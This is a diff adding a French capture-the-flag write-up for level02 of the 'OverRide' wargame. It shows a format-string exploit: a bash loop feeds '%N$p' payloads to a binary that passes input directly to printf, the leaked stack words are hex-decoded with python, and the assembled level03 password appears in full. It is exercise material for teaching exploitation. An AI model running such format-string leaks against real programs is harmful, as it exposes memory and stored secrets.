@@ -1,0 +1,29 @@
+Un main gigantesque cette fois ! Nous remarquons beaucoup de chose en lisant tout ca.
+
+Nous pouvons voir un fopen et un fread (fread est une fonction qui lit l'entrée de la mémoire tampon d'un fichier) dans le fichier password. On voit surtout que printf appel une variable directement, ce qui nous permet d'afficher la stack.
+
+level02@OverRide:~$ for(( i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
+21 - (nil) does not have access!
+22 - 0x756e505234376848 does not have access!
+23 - 0x45414a3561733951 does not have access!
+24 - 0x377a7143574e6758 does not have access!
+25 - 0x354a35686e475873 does not have access!
+26 - 0x48336750664b394d does not have access!
+27 - (nil) does not have access!
+
+On convertit les resultats des 5 seuls lignes ayant un vrai resultat,
+python -c 'print "756e505234376848".decode("hex")[::-1]'
+Hh74RPnu
+python -c 'print "45414a3561733951".decode("hex")[::-1]'
+Q9sa5JAE
+python -c 'print "377a7143574e6758".decode("hex")[::-1]'
+XgNWCqz7
+python -c 'print "354a35686e475873".decode("hex")[::-1]'
+sXGnh5J5
+python -c 'print "48336750664b394d".decode("hex")[::-1]'
+M9KfPg3H
+
+La combinaison des 5 nous donne le flag.
+
+su level03
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
